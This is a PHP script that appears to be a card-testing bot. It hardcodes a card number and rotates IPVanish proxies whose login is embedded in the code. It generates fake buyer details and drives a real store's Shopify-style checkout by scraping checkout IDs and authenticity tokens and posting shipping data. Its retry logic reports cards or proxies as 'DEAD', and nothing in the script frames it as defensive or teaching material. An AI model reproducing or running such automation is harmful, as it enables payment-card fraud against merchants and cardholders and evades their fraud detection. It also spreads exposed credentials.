<?php 

require_once '../src/CurlX.php';
require_once '../src/Response.php';
require_once '../src/Tools.php';

$CurlX = new CurlX;

$response = new Response;

$tools = new Tools;


$cc = '4147202422767408';


$retry = 0;
$cookie = uniqid();

$proxy = [
    "METHOD" => "IPVANISH",
    "SERVER" => $CurlX::GetRandVal("ipvanish_servers.txt").":1080",
    "AUTH"   => "0GCDIk9Z5xj:rAnllC22Tq"
];

$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);

start:

extract($tools::GetUser());

if ($retry > 1) {
	EchoMessage('DEAD', $cc_info.' | Maximum Retrys Reached | Proxy Dead ❌ ');
	exit;
}


$data = 'form_type=product&utf8=%E2%9C%93&id=32501288075313&quantity=1';
$request = $CurlX::Post('https://pixiecrush.com/cart/add.js', $data, null, $cookie, $proxy)->body;
$request = $CurlX::Get('https://pixiecrush.com/cart.js', null, $cookie, $proxy)->body;
$data = 'note=&checkout=';
$request = $CurlX::Post('https://pixiecrush.com/cart', $data, null, $cookie, $proxy)->body;

$Location = trim(strip_tags($CurlX::ParseString($request, '<form data-customer-information-form="true" data-email-or-phone="false" class="edit_checkout" novalidate="novalidate" action="', ' ')));
$id_1   = trim(strip_tags($CurlX::ParseString($Location, '/', '/checkouts/')));
$id_2   = trim(strip_tags($CurlX::ParseString($Location, '/checkouts/','"')));
echo "Location: $Location<br><hr>";

echo "Key 1:$id_1<br><hr>";

echo "Key 2:$id_2<br><hr>";

$request = $CurlX::Get('https://pixiecrush.com/'.$id_1.'/checkouts/'.$id_2.'?step=contact_information', null, $cookie, $proxy)->body;

$authenticity_token = trim(strip_tags($CurlX::ParseString($request,'input type="hidden" name="authenticity_token" value="','"')));

echo "authenticity_token: $authenticity_token<br><hr>";

$data = '_method=patch&authenticity_token='.urlencode($authenticity_token).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.$mail.'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=ads&checkout%5Bshipping_address%5D%5Blast_name%5D=dada&checkout%5Bshipping_address%5D%5Baddress1%5D=street+23&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=ny&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10080&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=631&checkout%5Bclient_details%5D%5Bbrowser_height%5D=868&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300';

$request = $CurlX::Post('https://pixiecrush.com/'.$id_1.'/checkouts/'.$id_2.'', $data, null, $cookie, $proxy)->body;

echo "r6:$request<br><hr>";

$request = $CurlX::Get('https://pixiecrush.com/'.$id_1.'/checkouts/'.$id_2.'?previous_step=contact_information&step=shipping_method', null, $cookie, $proxy)->body;

$authenticity = trim(strip_tags($CurlX::ParseString($request,'<input type="hidden" name="authenticity_token" value="','"')));
echo "r7:$request<br><hr>";
echo "authenticity: $authenticity<br><hr>";

$data = '_method=patch&authenticity_token='.urlencode($authenticity).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=FBA+Shipping+by+ByteStand-MCF%2B44-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=648&checkout%5Bclient_details%5D%5Bbrowser_height%5D=868&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300';

$request = $CurlX::Post('https://pixiecrush.com/'.$id_1.'/checkouts/'.$id_2.'', $data, null, $cookie, $proxy)->body;

echo "r8: $request<br><hr>";


$CurlX::DeleteAllCookies();

$CurlX::Debug();

?>